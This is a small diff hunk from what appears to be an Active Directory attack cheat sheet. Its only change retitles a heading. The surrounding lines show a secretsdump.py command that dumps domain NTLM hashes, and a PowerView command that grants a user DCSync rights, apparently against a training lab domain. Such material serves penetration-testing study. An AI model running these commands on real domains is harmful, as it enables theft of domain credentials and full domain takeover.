@@ -158,7 +158,7 @@ secretsdump.py -hashes <> -just-dc-ntlm <domain>/<user>@<IP-DC>
 ```
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName <..USER..> -Rights DCSync -Verbose
 ```
-# Modify Security Descriptor WMI
+# Modify Security Descriptor
 
 ### Give user right to execute remotely WMI:
 
